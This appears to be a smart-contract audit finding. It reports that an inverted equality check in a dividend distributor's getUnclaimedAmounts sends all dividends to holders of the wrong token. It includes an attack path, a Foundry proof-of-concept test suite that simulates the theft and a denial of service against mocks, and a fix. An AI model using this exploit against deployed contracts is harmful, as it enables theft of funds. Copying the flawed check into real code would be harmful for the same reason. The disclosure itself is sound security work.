# [000693] Incorrect Token Comparison Logic in `getUnclaimedAmounts` Allows Attackers to Steal All Dividends
  
  ### Summary

In `A26ZDividendDistributor.sol:141` the token comparison uses `==` instead of `!=`, causing the function to return 0 for legitimate holders (matching tokens) and calculate amounts for illegitimate holders (non-matching tokens). This will cause a complete loss of dividends for legitimate TVS holders as any user with a non-matching token allocation will receive all distributed dividends.

### Root Cause

In [A26ZDividendDistributor.sol:141](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L141) the comparison operator is inverted:

```solidity
function getUnclaimedAmounts(uint256 nftId) public returns (uint256 amount) {
    if (address(token) == address(vesting.allocationOf(nftId).token)) return 0;  // @audit INVERTED
    // ... calculation logic
}
```

The intended behavior:
- If tokens DON'T match -> return 0 (NFT is for different project, not eligible)
- If tokens DO match -> calculate unclaimed amount (NFT is eligible for dividends)

The actual buggy behavior:
- If tokens DO match -> return 0 (legitimate holders get nothing)
- If tokens DON'T match -> calculate amount (illegitimate holders get dividends)

### Internal Pre-conditions

1. Owner needs to deploy `A26ZDividendDistributor` with a specific `token` address for dividend distribution
2. Owner needs to call `setUpTheDividends()` to distribute dividends to TVS holders
3. At least one NFT holder needs to have an allocation with the matching token (legitimate holder)

### External Pre-conditions

None required.

### Attack Path

1. Attacker obtains an NFT from a different project that uses a different token than the dividend distributor's configured token
2. Owner deposits stablecoins and calls `setUpTheDividends()` to distribute dividends
3. Due to inverted logic, `getUnclaimedAmounts()` returns 0 for all legitimate holders (matching token) and returns calculated amounts for the attacker (non-matching token)
4. `_setDividends()` allocates 100% of dividends to the attacker since they are the only one with non-zero unclaimed amounts
5. Attacker calls `claimDividends()` after vesting period and receives all distributed stablecoins
6. Legitimate holders call `claimDividends()` but receive 0

### Impact

The legitimate TVS holders suffer a 100% loss of their entitled dividends. The attacker gains 100% of the dividend pool without being entitled to any dividends.

Additionally, if all NFT holders have matching tokens (all legitimate), `totalUnclaimedAmounts` will be 0, causing `setUpTheDividends()` to revert with division by zero, resulting in complete DoS of the dividend distribution functionality.


### PoC

Save this POC to `protocol/test/M02_IncorrectTokenComparisonLogic.t.sol`

Run with:
```bash
forge test --match-contract M02_IncorrectTokenComparisonLogicTest -vvv
```

### POC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {IAlignerzVesting} from "../src/interfaces/IAlignerzVesting.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockVesting {
    mapping(uint256 => IAlignerzVesting.Allocation) public allocations;

    function setAllocation(
        uint256 nftId,
        uint256[] memory amounts,
        uint256[] memory vestingPeriods,
        uint256[] memory vestingStartTimes,
        uint256[] memory claimedSeconds,
        bool[] memory claimedFlows,
        address tokenAddr
    ) external {
        allocations[nftId].amounts = amounts;
        allocations[nftId].vestingPeriods = vestingPeriods;
        allocations[nftId].vestingStartTimes = vestingStartTimes;
        allocations[nftId].claimedSeconds = claimedSeconds;
        allocations[nftId].claimedFlows = claimedFlows;
        allocations[nftId].token = IERC20(tokenAddr);
    }

    function allocationOf(uint256 nftId) external view returns (IAlignerzVesting.Allocation memory) {
        return allocations[nftId];
    }
}

contract MockNFT {
    mapping(uint256 => address) public owners;
    uint256 public totalMinted;

    function setOwner(uint256 tokenId, address owner) external {
        owners[tokenId] = owner;
        if (tokenId >= totalMinted) {
            totalMinted = tokenId + 1;
        }
    }

    function extOwnerOf(uint256 tokenId) external view returns (address) {
        require(owners[tokenId] != address(0), "Token does not exist");
        return owners[tokenId];
    }

    function getTotalMinted() external view returns (uint256) {
        return totalMinted;
    }
}

contract M02_IncorrectTokenComparisonLogicTest is Test {
    A26ZDividendDistributor public distributor;
    MockVesting public mockVesting;
    MockNFT public mockNft;

    Aligners26 public correctToken;
    Aligners26 public wrongToken;
    MockUSD public stablecoin;

    address public owner;
    address public victim;
    address public attacker;

    uint256 constant DIVIDEND_POOL = 100_000e6;
    uint256 constant TOKEN_ALLOCATION = 10_000 ether;
    uint256 constant VESTING_PERIOD = 90 days;

    function setUp() public {
        owner = address(this);
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        correctToken = new Aligners26("Correct Token", "CORRECT");
        wrongToken = new Aligners26("Wrong Token", "WRONG");
        stablecoin = new MockUSD();

        mockVesting = new MockVesting();
        mockNft = new MockNFT();

        distributor = new A26ZDividendDistributor(
            address(mockVesting),
            address(mockNft),
            address(stablecoin),
            block.timestamp,
            VESTING_PERIOD,
            address(correctToken)
        );

        stablecoin.mint(owner, DIVIDEND_POOL);
    }

    function _createAllocation(uint256 nftId, address holder, address tokenAddr) internal {
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = TOKEN_ALLOCATION;

        uint256[] memory vestingPeriods = new uint256[](1);
        vestingPeriods[0] = VESTING_PERIOD;

        uint256[] memory vestingStartTimes = new uint256[](1);
        vestingStartTimes[0] = block.timestamp;

        uint256[] memory claimedSeconds = new uint256[](1);
        claimedSeconds[0] = 1;

        bool[] memory claimedFlows = new bool[](1);
        claimedFlows[0] = false;

        mockNft.setOwner(nftId, holder);
        mockVesting.setAllocation(nftId, amounts, vestingPeriods, vestingStartTimes, claimedSeconds, claimedFlows, tokenAddr);
    }

    function test_RootCause_InvertedTokenComparison() public {
        _createAllocation(0, victim, address(correctToken));
        _createAllocation(1, attacker, address(wrongToken));

        uint256 victimUnclaimed = distributor.getUnclaimedAmounts(0);
        uint256 attackerUnclaimed = distributor.getUnclaimedAmounts(1);

        assertEq(victimUnclaimed, 0, "BUG: Victim with MATCHING token gets 0");
        assertGt(attackerUnclaimed, 0, "BUG: Attacker with WRONG token gets amount");
    }

    function test_Exploit_AttackerSteals100PercentOfDividends() public {
        _createAllocation(0, victim, address(correctToken));
        _createAllocation(1, attacker, address(wrongToken));

        stablecoin.transfer(address(distributor), DIVIDEND_POOL);
        distributor.setUpTheDividends();

        vm.warp(block.timestamp + VESTING_PERIOD);

        vm.prank(victim);
        distributor.claimDividends();

        vm.prank(attacker);
        distributor.claimDividends();

        assertEq(stablecoin.balanceOf(victim), 0, "Victim received 0 USDC");
        assertEq(stablecoin.balanceOf(attacker), DIVIDEND_POOL, "Attacker stole 100,000 USDC");
    }

    function test_Impact_MultipleVictimsLoseAllDividends() public {
        address victim1 = makeAddr("victim1");
        address victim2 = makeAddr("victim2");
        address victim3 = makeAddr("victim3");

        _createAllocation(0, victim1, address(correctToken));
        _createAllocation(1, victim2, address(correctToken));
        _createAllocation(2, victim3, address(correctToken));
        _createAllocation(3, attacker, address(wrongToken));

        stablecoin.transfer(address(distributor), DIVIDEND_POOL);
        distributor.setUpTheDividends();

        vm.warp(block.timestamp + VESTING_PERIOD);

        vm.prank(victim1);
        distributor.claimDividends();
        vm.prank(victim2);
        distributor.claimDividends();
        vm.prank(victim3);
        distributor.claimDividends();
        vm.prank(attacker);
        distributor.claimDividends();

        assertEq(stablecoin.balanceOf(victim1), 0, "Victim1: 0 USDC");
        assertEq(stablecoin.balanceOf(victim2), 0, "Victim2: 0 USDC");
        assertEq(stablecoin.balanceOf(victim3), 0, "Victim3: 0 USDC");
        assertEq(stablecoin.balanceOf(attacker), DIVIDEND_POOL, "Attacker stole all 100,000 USDC");
    }

    function test_Impact_DivisionByZeroRevertsSetup() public {
        _createAllocation(0, victim, address(correctToken));
        _createAllocation(1, makeAddr("victim2"), address(correctToken));

        stablecoin.transfer(address(distributor), DIVIDEND_POOL);

        uint256 totalUnclaimed = distributor.getTotalUnclaimedAmounts();
        assertEq(totalUnclaimed, 0, "Total unclaimed is 0 due to inverted logic");

        vm.expectRevert();
        distributor.setUpTheDividends();
    }
}

```

### Mitigation

Change the comparison operator from `==` to `!=`:

```diff
function getUnclaimedAmounts(uint256 nftId) public returns (uint256 amount) {
-   if (address(token) == address(vesting.allocationOf(nftId).token)) return 0;
+   if (address(token) != address(vesting.allocationOf(nftId).token)) return 0;
    // ... rest of calculation logic
}
```
  